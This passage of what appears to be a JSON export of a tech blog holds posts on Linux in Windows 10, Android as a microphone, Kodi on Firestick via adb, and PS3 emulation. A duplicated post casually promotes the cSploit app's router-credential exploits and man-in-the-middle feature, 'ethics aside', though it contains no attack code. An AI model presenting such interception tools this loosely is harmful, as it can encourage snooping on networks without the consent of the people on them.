src=\"http://www.davebennett.tech/wp-content/uploads/2016/08/P1000147.00013513.Still002-1024x576.jpg\" alt=\"Android as Second Monitor\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/08/P1000147.00013513.Still002-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/08/P1000147.00013513.Still002-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/08/P1000147.00013513.Still002-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/08/P1000147.000135_13.Still002.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\r\n\r\n&nbsp;\r\n",
        "tags": [
            "android",
            "display",
            "monitor",
            "second",
            "trick",
            "tutorial",
            "vnc",
            "windows"
        ]
    },
    {
        "uri": "/linux-in-windows-10/",
        "title": "Linux in Windows 10",
        "content": "Microsoft has done something really cool in the Windows 10 Anniversary Update. They gave users the ability to use the Linux Bash Command Line from within Windows. This is not through a virtual machine nor container, but a subsystem that they previously added in an earlier Windows update. Here&#8217;s how you can enable Linux in Windows 10:\n\nWhat You Will Need:\n\n  a href=\"https://support.microsoft.com/en-us/help/12387/windows-10-update-history\" target=\"_blank\" rel=\"noopener\"Windows 10 Anniversary Update/a\n\n How To:\n\n­\n\nFirst, go into the start menu and search for the Windows Update Settings.\n\nimg class=\"alignnone size-large wp-image-1659\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/08/Windows-Update-Settings-1024x576.jpg\" alt=\"Windows Update Settings\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/08/Windows-Update-Settings-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/08/Windows-Update-Settings-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/08/Windows-Update-Settings-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/08/Windows-Update-Settings.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\n\nGo to the tab that says “For Developers” and enable Developer mode.\n\nimg class=\"alignnone size-large wp-image-1658\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/08/Developer-Mode-1024x576.jpg\" alt=\"Developer Mode\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/08/Developer-Mode-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/08/Developer-Mode-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/08/Developer-Mode-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/08/Developer-Mode.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\n\nThen go into Programs and Features. Select the option to turn Widows features on or off. In the Window, select the option “Windows Subsystem for Linux” then reboot your computer.\n\nimg class=\"alignnone size-large wp-image-1657\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/08/Windows-Features-1024x576.jpg\" alt=\"Windows Features\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/08/Windows-Features-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/08/Windows-Features-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/08/Windows-Features-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/08/Windows-Features.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\n\nNow, when you type in bash in the start menu, you should see the bash command line. When you launch it, it will run the setup.\n\nThat’s it, now you have access to the Linux command line and even the apt repository.\n\nimg class=\"alignnone wp-image-1656 size-large\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/08/bash-1024x576.jpg\" alt=\"Linux in Windows 10\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/08/bash-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/08/bash-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/08/bash-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/08/bash.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\n",
        "tags": [
            "anniversary",
            "bash",
            "emulate",
            "linux",
            "ubuntu",
            "update",
            "windows 10"
        ]
    },
    {
        "uri": "/galaxy-note-7-exploding/",
        "title": "Galaxy Note 7 Exploding",
        "content": "{{ youtube XdylvXX2G0g }}\r\n\r\nSamsung has recalled Galaxy Note 7 devices world wide due to incidents of explosion. What causes these devices and other Lithium-ion batteries to malfunction?\r\n",
        "tags": [
            "device",
            "explained",
            "exploding",
            "galaxy",
            "note 7",
            "recall"
        ]
    },
    {
        "uri": "/android-csploit-2/",
        "title": "Android cSploit",
        "content": "{{ youtube s8yk05hrt4Q }}\r\n\r\nA little while ago, there was this awesome program called dSploit. It was a network security app that provided users with an abundance of tools and operations to test the strength of their network security. Recently, dSploit was merged with a proprietary closed source app that isn&#8217;t free. While you can find older copies of dSploit floating around on the internet, none of them are up to date. Luckily, there&#8217;s an opensource implementation of dSploit over on a href=\"https://github.com/cSploit/android\" target=\"_blank\"Github/a called cSploit.\r\n\r\nimg class=\"alignnone wp-image-1678 size-medium\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Screenshot20160915-091342-169x300.png\" alt=\"Android Csploit\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091342-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091342-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091342-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091342.png 1080w\" sizes=\"(max-width: 169px) 100vw, 169px\" /img class=\"alignnone wp-image-1675 size-medium\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Screenshot20160915-091227-169x300.png\" alt=\"screenshot20160915-091227\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091227-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091227-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091227-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091227.png 1080w\" sizes=\"(max-width: 169px) 100vw, 169px\" /img class=\"alignnone size-medium wp-image-1676\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Screenshot20160915-091313-169x300.png\" alt=\"screenshot20160915-091313\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091313-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091313-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091313-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot_20160915-091313.png 1080w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\r\n\r\n&nbsp;\r\n\r\nKey Features of Csploit:\r\n\r\nWithout going into too much detail, I&8217;m going to briefly cover some of the highlights of cSploit. Feel free to browse around the Github for more information.\r\n\r\nRouter Login:\r\n\r\nIf you are like me and forgot the login to your router, this will come in handy. Using exploits, cSploit can help you identify the username and password login to your router. This will not work on all models, especially newer ones. However, this could definitely be a last minute resort before you have to perform a factory reset.\r\n\r\n Hidden Networks\r\n\r\nCsploit can show you hidden networks.\r\n\r\nMITM\r\n\r\nThis is the feature that everyone is always interested in, though a legitimate use case for this is questionable. Ethics aside, the MITM (Man in the Middle) function does exactly what it says. It can direct network to an Android device before it hits the router. I&8217;ll let you explore the rest.\r\n\r\nPacket Forger\r\n\r\nThis allows you to send cutom packets. This is useful if you&8217;re trying to setup a Wake on Lan system.\r\n\r\nimg class=\"alignnone wp-image-1677 size-medium\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Screenshot20160915-091337-169x300.png\" alt=\"Csploit Packet\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091337-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091337-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091337-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot_20160915-091337.png 1080w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n",
        "tags": [
            "android",
            "csploit",
            "dsploit",
            "etnwork",
            "opensourcegangster",
            "root"
        ]
    },
    {
        "uri": "/android-csploit/",
        "title": "Android cSploit",
        "content": "{{ youtube s8yk05hrt4Q }}\r\n\r\nA little while ago, there was this awesome program called dSploit. It was a network security app that provided users with an abundance of tools and operations to test the strength of their network security. Recently, dSploit was merged with a proprietary closed source app that isn&#8217;t free. While you can find older copies of dSploit floating around on the internet, none of them are up to date. Luckily, there&#8217;s an opensource implementation of dSploit over on a href=\"https://github.com/cSploit/android\" target=\"_blank\"Github/a called cSploit.\r\n\r\nimg class=\"alignnone wp-image-1678 size-medium\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Screenshot20160915-091342-169x300.png\" alt=\"Android Csploit\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091342-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091342-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091342-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091342.png 1080w\" sizes=\"(max-width: 169px) 100vw, 169px\" /img class=\"alignnone wp-image-1675 size-medium\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Screenshot20160915-091227-169x300.png\" alt=\"screenshot20160915-091227\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091227-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091227-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091227-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091227.png 1080w\" sizes=\"(max-width: 169px) 100vw, 169px\" /img class=\"alignnone size-medium wp-image-1676\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Screenshot20160915-091313-169x300.png\" alt=\"screenshot20160915-091313\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091313-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091313-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091313-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot_20160915-091313.png 1080w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\r\n\r\n&nbsp;\r\n\r\nKey Features of Csploit:\r\n\r\nWithout going into too much detail, I&8217;m going to briefly cover some of the highlights of cSploit. Feel free to browse around the Github for more information.\r\n\r\nRouter Login:\r\n\r\nIf you are like me and forgot the login to your router, this will come in handy. Using exploits, cSploit can help you identify the username and password login to your router. This will not work on all models, especially newer ones. However, this could definitely be a last minute resort before you have to perform a factory reset.\r\n\r\n Hidden Networks\r\n\r\nCsploit can show you hidden networks.\r\n\r\nMITM\r\n\r\nThis is the feature that everyone is always interested in, though a legitimate use case for this is questionable. Ethics aside, the MITM (Man in the Middle) function does exactly what it says. It can direct network to an Android device before it hits the router. I&8217;ll let you explore the rest.\r\n\r\nPacket Forger\r\n\r\nThis allows you to send cutom packets. This is useful if you&8217;re trying to setup a Wake on Lan system.\r\n\r\nimg class=\"alignnone wp-image-1677 size-medium\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Screenshot20160915-091337-169x300.png\" alt=\"Csploit Packet\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091337-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091337-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160915-091337-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot_20160915-091337.png 1080w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n",
        "tags": [
            "android",
            "csploit",
            "dsploit",
            "etnwork",
            "opensourcegangster",
            "root"
        ]
    },
    {
        "uri": "/use-android-as-microphone/",
        "title": "Use Android as Microphone",
        "content": "{{ youtube gN_d-1OVwoU }}\r\n\r\nHave you ever needed a microphone, but did not have one available? Have you ever searched for a way to make a cheap wireless microphone? Needless to say, you can use your Android device as a microphone. There are two ways that this can be accomplished. The first is through traditional cables, and the second is through additional software. If you want to use your Android device as a microphone through USB, Wifi or Bluetooth, then skip to the second method.\r\n\r\nOption 1: The Simple Way\r\n\r\nThis option is for those of you who do not like installing additional software. For this option, you will need to have a 3.5mm audio cable.\r\n\r\nimg class=\"alignnone wp-image-1698 size-large\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Headphone-1024x576.jpg\" alt=\"Android as Microphone\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Headphone-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/09/Headphone-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/09/Headphone-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Headphone.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\r\n\r\nPlug one end into the 3.5mm port on your phone and the other into the audio jack on your computer. In the Windows audio settings, select your Android phone as the current input device.\r\n\r\nimg class=\"alignnone size-large wp-image-1697\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/audio-input-1024x576.jpg\" alt=\"audio-input\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/audio-input-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/09/audio-input-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/09/audio-input-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/09/audio-input.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\r\n\r\nThen download the a href=\"https://play.google.com/store/apps/details?id=com.grace.microphone\" target=\"_blank\"Microphone /aapp from the PayStore. This app will redirect audio from your microphone to your 3.5 mm output so that you can get sound on your PC. You can either adjust the gain from within the app or within Windows.\r\n\r\nimg class=\"alignnone wp-image-1695 size-medium\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Screenshot20160922-173122-169x300.jpg\" alt=\"Android as Microphone\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot20160922-173122-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/09/Screenshot_20160922-173122.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\r\n\r\nTap the microphone icon to start recording (not actually recording, just redirecting the sound to your computer). The sound quality is average. Even with the gain turned down low, there was a lot of distortion. I had to speak very softly and far away from the phone to get clean sound.\r\n\r\n Option 2: WO Mic\r\n\r\nIf you are looking for a way to use your Android device as a microphone through USB, Wifi or Bluetooth, then this is what you want. Download a href=\"http://www.wirelessorange.com/womic/install.html\" target=\"_blank\"WO Mic/a for your Desktop and Android device. Don&#8217;t forget to also install the device driver and reboot your computer once it&#8217;s done.\r\n\r\nOn your Android device, choose the protocol that you would like to use for WO Mic. I am going to choose USB. Then go back to the main screen and tap the start button to start the service.\r\n\r\n\r\n\r\nOn your desktop, connect to the WO Mic client using the matching protocol (USB in my case).\r\n\r\nimg class=\"alignnone size-large wp-image-1696\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Connect-using-wo-mic-1024x576.jpg\" alt=\"connect-using-wo-mic\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Connect-using-wo-mic-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/09/Connect-using-wo-mic-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/09/Connect-using-wo-mic-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Connect-using-wo-mic.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\r\n\r\nThat&#8217;s all the setup you need. Windows will detect it as if it&#8217;s a regular microphone. Oddly enough, I found that stream over WiFi produced the best sound quality.\r\n",
        "tags": [
            "android",
            "audio",
            "bluetooth",
            "cheap",
            "handheld",
            "headphone",
            "input",
            "jack",
            "microphone",
            "skype",
            "wifi",
            "windows",
            "wireless",
            "womic"
        ]
    },
    {
        "uri": "/need-imessage-android/",
        "title": "Do we need imessage for Android",
        "content": "{{ youtube AhtOgCX8w1A }}\r\n\r\n* *\r\n\r\nEveryone has been talking about having an iMessage for Android. With the recent release of Google Allo, many people were disappointed that Allo did not have SMS fallback? But, do we really need an iMessage for Android?\r\n",
        "tags": [
            "android",
            "apple",
            "google",
            "imessage",
            "messenger"
        ]
    },
    {
        "uri": "/kodi-on-firestick/",
        "title": "Kodi on Firestick",
        "content": "{{ youtube tCcWNIRI0qM }}\r\n\r\nKodi on Firestick? Kodi (formerly XMBC) is a very popular platform for video entertainment that is designed to work on almost all operating systems. Previously, I shown how you can get a href=\"http://www.davebennett.tech/install-kodi-on-chromebook/\" target=\"blank\"Kodi on the Chromebook/a. You can also install a href=\"https://play.google.com/store/apps/details?id=org.xbmc.kodi\" target=\"blank\"Kodi on Android/a and a href=\"https://kodi.tv/download/\" target=\"_blank\"Windows/a. For this tutorial, let&#8217;s take a look at how to install Kodi on the Amazon Firestick.\r\n\r\n* *\r\n\r\nThe Easy Way:\r\n\r\nIf you have an Android device, do yourself a favor and use this method. First, make sure your Firestick is connected to your home WiFi network. Then, go to Settings &8211; System &#8212;Developer Options\r\n\r\nMake sure that ADB debugging and Unknown sources are enabled.\r\n\r\nimg class=\"alignnone size-large wp-image-1711\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/Developer-options-1024x576.jpg\" alt=\"developer-options\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/Developer-options-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/09/Developer-options-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/09/Developer-options-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/09/Developer-options.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /img class=\"alignnone size-large wp-image-1710\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/09/debugging-1024x576.jpg\" alt=\"debugging\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/09/debugging-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/09/debugging-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/09/debugging-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/09/debugging.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\r\n\r\nThen go to back to the About tab. Go to Network (within that Tab) and take note of your Firestick&#8217;s IP address.\r\n\r\nFinally, download and app called a href=\"https://play.google.com/store/apps/details?id=mobi.koni.appstofiretv\" target=\"blank\"Apps2Fire for Android/a. **Also, make sure that you have a href=\"https://play.google.com/store/apps/details?id=org.xbmc.kodi\" target=\"blank\"Kodi installed on your Android device/a.** Within the Apps2Fire app, go to the setup tab. Type in the IP address of your Firestick.\r\n\r\n\r\n\r\nThen go to the local apps tab and find Kodi. Tap the name and hit install. It will install Kodi to your Firestick.\r\n\r\n\r\n\r\n* *\r\n\r\nThe Longer Way (Advanced Users):\r\n\r\nAnother way that you can get Kodi on your Firestick is using ADB. If you already have ADB setup on your computer you can start using the commands below. If you are completely new to the Android Development Bridge (ADB) then you are going to have to install it on your computer. You can either download the a href=\"https://developer.android.com/studio/index.htmldownloads\" target=\"blank\"whole SDK/a or use this a href=\"http://forum.xda-developers.com/showthread.php?p=48915118#post48915118\" target=\"blank\"quick installer/a (preferable way). This installer will setup ADB as a system path for you and do all the work.  To verify the installation worked correctly, go to command prompt and type in adb to confirm it&#8217;s working (that is, a list of help commands should appear).\r\n\r\nTo connect to your firestick vis ADB first download and install a href=\"https://s3.amazonaws.com/android-sdk-manager/redist/firedevicesusbdriver.zip\" target=\"blank\"the drivers for the Firestick/a.\r\n\r\nI am going to assume that you are doing this through WiFi. Type in the following commands:\r\n\r\nadb kill-server\r\n\r\nadb start-server\r\n\r\nadb connect 192.168.xxx (the ip address of your Firestick)\r\n\r\nNext, download the a href=\"http://mirrors.kodi.tv/releases/android/arm/kodi-16.1-Jarvis-armeabi-v7a.apk\" target=\"_blank\"Kodi apk/a.\r\n\r\nIn Command Prompt, navigate to the directory of the Apk. (You can also go to the directory and windows explorer, hold down shift and right click. You will get an option to open command window here).\r\n\r\nFinally, type in:\r\n\r\nadb install kodi.apk (if it's not named Kodi, replace it with the name of the file)\r\n\r\nThat&#8217;s it, now you have Kodi on Firestick. If you still need help using this method, a href=\"https://developer.amazon.com/public/solutions/devices/fire-tv/docs/connecting-adb-to-fire-tv-device\" target=\"_blank\"refer to Amazon&#8217;s ADB instructions/a.\r\n",
        "tags": [
            "amazon",
            "android",
            "entertainment",
            "firestick",
            "kodi",
            "video",
            "vlc",
            "xmbc"
        ]
    },
    {
        "uri": "/google-pixel-phone-disappointment/",
        "title": "Google Pixel Phone Disappointment",
        "content": "{{ youtube YFUYina5h-o }}\r\n\r\n* *\r\n\r\nGoogle has announced their new phone, the Pixel. It&#8217;s coming off the heels of the forever loved Nexus program. IMO, this new Google Phone is asking too much while offering too little.\r\n",
        "tags": [
            "android",
            "google",
            "nexus",
            "phone",
            "pixel"
        ]
    },
    {
        "uri": "/galaxy-note-7-discontinued/",
        "title": "Galaxy Note 7 Discontinued",
        "content": "{{ youtube mVRaNiTCKHQ }}\r\n\r\nIt&#8217;s over. The Galaxy Note 7 is discontinued. So what should we expect now?\r\n",
        "tags": []
    },
    {
        "uri": "/moto-z-play-unboxing/",
        "title": "Moto Z Play Unboxing",
        "content": "{{ youtube JKRVqh4ew1s }}\r\n\r\nAn Unboxing of the Moto Z Play. Motorola&#8217;s surprisingly good mid-Range smartphone.\r\n",
        "tags": [
            "android",
            "budget.smartphopne",
            "moto",
            "moto z",
            "unboxing",
            "z"
        ]
    },
    {
        "uri": "/actual-android-battery-capacity/",
        "title": "Your Android Actual Battery Capacity",
        "content": "{{ youtube TSSxQOCka_4 }}\r\n\r\nYou might think that your battery is fine, but your capacity could be less than when you first bought it. What is your android actual battery capacity?\r\n",
        "tags": [
            "android",
            "battery",
            "capacity"
        ]
    },
    {
        "uri": "/moto-z-play-review/",
        "title": "Moto Z Play Review",
        "content": "{{ youtube 4c-yQIDlFBw }}\r\n\r\nAre you looking for a phone that will give you the best battery life? If so, the $450 unlocked Moto Z Play is what you need. Check out this video of the Moto Z Play.\r\n",
        "tags": [
            "android",
            "battery",
            "moto",
            "moto z",
            "moto z play",
            "review",
            "smartphone"
        ]
    },
    {
        "uri": "/moto-z-play-vs-oneplus-3/",
        "title": "Moto Z Play vs Oneplus 3",
        "content": "{{ youtube wmRnnXiaqLU }}\r\n\r\nWatch this hands-on comparison of the Moto Z Play vs Oneplus 3 and decide which device is better for you.\r\n",
        "tags": [
            "comparison",
            "moto",
            "moto z",
            "moto z play",
            "oneplus",
            "oneplus 3"
        ]
    },
    {
        "uri": "/play-playstation-3-games-on-pc/",
        "title": "Play PlayStation 3 Games on PC",
        "content": "{{ youtube JrIdxHpAUm8 }}\r\n\r\nAlthough the PlayStation 4 is the latest console from Sony, the PlayStation 3 is still a popular game system that is enjoyed by many. One group of developers have been actively working to bring the PlayStation 3 experience to your PC. RPCS3 is an open source PlayStation 3 emulator. The emulator is still in early alpha stages, so don&#8217;t expect many commercial titles to be compatible. It works well with homebrew games and games which do not require advanced 3D graphics. So here&#8217;s how you can play PlayStation 3 games on PC:\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"https://ci.appveyor.com/project/rpcs3/rpcs3/branch/master/artifacts\" target=\"_blank\"RPCS3/a\r\n  PlayStation 3 Firmware Files\r\n  PlayStaion 3 Games\r\n  Windows PC\r\n\r\n Step 1: Getting the Firmware\r\n\r\nThe first thing you need to do is download and unzip RPCS3 from the link above. After you unzip it, you will need to get the Library Modules **and **Firmware files.  The firmware files that you need are called flashATRAC.pic and *flashMP3.pic. *You absolutely need these to run any PlayStation 3 games. Likewise, there are a whole bunch of library files that certain games might need, such as shaders, geometry, etc.  These files could be obtained by using FTP on your PS3 console and grabbing them from \\devflash\\sys\\external. Or, you could also grab them from this a href=\"https://github.com/skrptktty/ps3-firmware-beginners-luck/tree/master/PS3355/PS3355exploded/updatefiles/devflash/sys/external\" target=\"_blank\"GitHub/a.\r\n\r\nStep 2: Putting the Firmware\r\n\r\nOnce you have the flashATRAC.pic, flashMP3.pic and the library files, transfer them to the folder named  \\devflash\\sys\\external._\r\n\r\nimg class=\"alignnone wp-image-1901 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/firmware-sprx-libraries-300x294.png\" alt=\"firmware-sprx-libraries\" width=\"300\" height=\"294\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/firmware-sprx-libraries-300x294.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/firmware-sprx-libraries-768x754.png 768w, http://localhost/wordpress/wp-content/uploads/2016/11/firmware-sprx-libraries.png 858w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\n Step 3: Decrypting the Libraries\r\n\r\nThe next thing that you need to do is decrypt the library modules so that they can be used in the RPCS3 program. Open up RPCS3 and go to Tools _and select _Decrypt SPRX Libraries. Navigate to \\devflash\\sys\\external _and select all the .prx libraries*.* It should take a couple of seconds to decrypt all the libraries.\r\n\r\nimg class=\"alignnone wp-image-1903 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/decrypt-sprx-files-300x56.png\" alt=\"decrypt-sprx-files\" width=\"300\" height=\"56\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/decrypt-sprx-files-300x56.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/decrypt-sprx-files-768x144.png 768w, http://localhost/wordpress/wp-content/uploads/2016/11/decrypt-sprx-files.png 889w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\nStep 4: Testing a Game\r\n\r\nThis is probably going to be the hardest and most ambiguous part of this tutorial. For game testing, I used the game Pixel by Arkedo Series. To find games, you can either grab them from your PS3 console or search the internet. The file format needs to either be an .elf file or .pkg. You will also need to obtain the *RAP *file for the game that you want. Transfer the *RAP *file to devhdd0\\home\\00000001\\exdata _\r\n\r\n\r\n\r\nThen to install the game, go to Boot and _Install PKG. _Navigate to the pkg file of the game and select it. You should see it appear in the Game List window.\r\n\r\nimg class=\"alignnone wp-image-1904 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/play-ps3-games-on-pc-pixel-game-300x198.png\" alt=\"play-ps3-games-on-pc-pixel-game\" width=\"300\" height=\"198\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/play-ps3-games-on-pc-pixel-game-300x198.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/play-ps3-games-on-pc-pixel-game-768x506.png 768w, http://localhost/wordpress/wp-content/uploads/2016/11/play-ps3-games-on-pc-pixel-game.png 936w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\n Step 5: Libraries\r\n\r\nNow that the game is installed, you will need to find out the libraries that the game needs. Go to Config then _Settings. _In order to determine the necessary libraries to enable, you will need to do some Google searching. Don&#8217;t just enable all of them because it will cause errors when loading the game. For the Game Pixel I enabled the following libraries:\r\n\r\nimg class=\"alignnone size-medium wp-image-1905\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/library-settings-300x283.png\" alt=\"library-settings\" width=\"300\" height=\"283\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/library-settings-300x283.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/library-settings.png 519w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\nNow Play:\r\n\r\nOnce you have figured out the libraries, go to Boot _and select the option to _Boot Game. If everything was setup correctly, the game should boot. If it doesn&8217;t, check the console in the main window. Chances are that there is a library that needs to be enabled or the game just isn&#8217;t compatible. Also, you can try switching your graphics settings from OpenGL to Vulkan or Direct3D to get the best compatibility and performance.\r\n\r\nimg class=\"alignnone size-large wp-image-1902\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/play-ps3-games-on-pc-1024x494.png\" alt=\"play-ps3-games-on-pc\" width=\"640\" height=\"309\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/play-ps3-games-on-pc-1024x494.png 1024w, http://localhost/wordpress/wp-content/uploads/2016/11/play-ps3-games-on-pc-300x145.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/play-ps3-games-on-pc-768x371.png 768w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2016/11/firmware-sprx-libraries.png\r\n [2]: http://localhost/wordpress/wp-content/uploads/2016/11/decrypt-sprx-files.png\r\n [3]: http://localhost/wordpress/wp-content/uploads/2016/11/rap-file.png\r\n [4]: 